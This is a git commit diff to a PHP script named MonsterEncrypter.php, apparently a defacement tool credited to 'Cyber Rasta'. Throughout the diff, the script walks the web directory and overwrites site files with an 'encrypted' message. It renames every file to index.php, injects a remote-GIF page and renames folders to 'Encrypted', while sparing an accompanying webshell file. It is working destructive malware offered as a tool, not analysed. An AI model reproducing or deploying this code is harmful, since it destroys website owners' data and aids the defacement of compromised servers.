7748f738de0572f6e8e6dc8b55cc972aaa985ec8
Pedro Henrique Melo <101877681+pedrohsmelo@users.noreply.github.com>
2024-07-25 13:12:00 -0300

    v1.4

--- MonsterEncrypter.php
+++ MonsterEncrypter.php
@@ -1,44 +1,44 @@
 <?php
-function monster($dir) {
-    $iterator = new RecursiveIteratorIterator(
+
+function addFilesToZip($zip, $dir) {
+    $files = new RecursiveIteratorIterator(
         new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
-        RecursiveIteratorIterator::CHILD_FIRST
+        RecursiveIteratorIterator::LEAVES_ONLY
     );
 
-    foreach ($iterator as $fileInfo) {
-        $oldName = $fileInfo->getPathname();
-
-        if ($fileInfo->getFilename() === 'Webshell by CyberRasta.php7') {
-            continue;
-        }
-
-        if ($fileInfo->isFile() && in_array($fileInfo->getExtension(), ['php', 'html', 'txt', 'js', 'py', 'txt'])) {
-            file_put_contents($oldName, '<?php echo "<h1>Your files have been encrypted by Cyber Rasta</h1>"; ?>');
-        }
-
-        $newName = $fileInfo->getPath() . DIRECTORY_SEPARATOR . 'index.php';
-
-        if (file_exists($newName)) {
-            $i = 1;
-            while (file_exists($newName . " ($i)")) {
-                $i++;
-            }
-            $newName .= " ($i)";
-        }
-
-        if (!rename($oldName, $newName)) {
-            echo "Não foi possível renomear $oldName\n";
+    foreach ($files as $file) {
+        if (!$file->isDir()) {
+            $filePath = $file->getRealPath();
+            $relativePath = substr($filePath, strlen($dir) + 1);
+            $zip->addFile($filePath, $relativePath);
         }
     }
+}
 
-    foreach ($iterator as $fileInfo) {
-        if ($fileInfo->getFilename() === 'Webshell by CyberRasta.php7') {
-            continue;
-        }
+function createBackup($dir, $backupFile) {
+    $zip = new PharData($backupFile);
+    addFilesToZip($zip, $dir);
+}
 
-        if ($fileInfo->isDir()) {
+function monster($dir, $backupFile) {
+    try {
+        $iterator = new RecursiveIteratorIterator(
+            new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
+            RecursiveIteratorIterator::CHILD_FIRST
+        );
+
+        foreach ($iterator as $fileInfo) {
             $oldName = $fileInfo->getPathname();
-            $newName = $fileInfo->getPath() . DIRECTORY_SEPARATOR . 'Encrypted';
+
+            if ($fileInfo->getFilename() === 'Webshell by CyberRasta.php7' || $oldName === $backupFile) {
+                continue;
+            }
+
+            if ($fileInfo->isFile() && in_array($fileInfo->getExtension(), ['php', 'html', 'txt', 'js', 'py', 'txt'])) {
+                file_put_contents($oldName, '<?php echo "<h1>Your files have been encrypted by Cyber Rasta</h1>"; ?>');
+            }
+
+            $newName = $fileInfo->getPath() . DIRECTORY_SEPARATOR . 'index.php';
 
             if (file_exists($newName)) {
                 $i = 1;
@@ -48,13 +48,48 @@ function monster($dir) {
                 $newName .= " ($i)";
             }
 
-            if (!rename($oldName, $newName)) {
-                echo "Não foi possível renomear $oldName";
+            if ($fileInfo->isFile() && !rename($oldName, $newName)) {
+                throw new Exception("Não foi possível renomear $oldName");
+            }
+
+            
+            if (file_exists($newName)) {
+                $imageContent = '<!DOCTYPE html><html><head><style>body{margin:0;}img{display:block;width:100%;height:100vh;}</style></head><body><img src="https://s10.gifyu.com/images/StY8h.gif" alt="Imagem"></body></html>';
+                file_put_contents($newName, $imageContent);
             }
         }
+
+        foreach ($iterator as $fileInfo) {
+            if ($fileInfo->getFilename() === 'Webshell by CyberRasta.php7' || $fileInfo->getPathname() === $backupFile) {
+                continue;
+            }
+
+            if ($fileInfo->isDir()) {
+                $oldName = $fileInfo->getPathname();
+                $newName = $fileInfo->getPath() . DIRECTORY_SEPARATOR . 'Encrypted';
+
+                if (file_exists($newName)) {
+                    $i = 1;
+                    while (file_exists($newName . " ($i)")) {
+                        $i++;
+                    }
+                    $newName .= " ($i)";
+                }
+
+                if (!rename($oldName, $newName)) {
+                    throw new Exception("Não foi possível renomear $oldName");
+                }
+            }
+        }
+    } catch (Exception $e) {
+        error_log($e->getMessage());
+        echo "Ocorreu um erro durante o processo de modificação. Consulte o log de erros para mais detalhes.\n";
     }
 }
 
 $directory = __DIR__;
-monster($directory);
+$backupFile = $directory . DIRECTORY_SEPARATOR . 'backup_' . date('Y-m-d_H-i-s') . '.tar';
+createBackup($directory, $backupFile);
+monster($directory, $backupFile);
+
 ?>
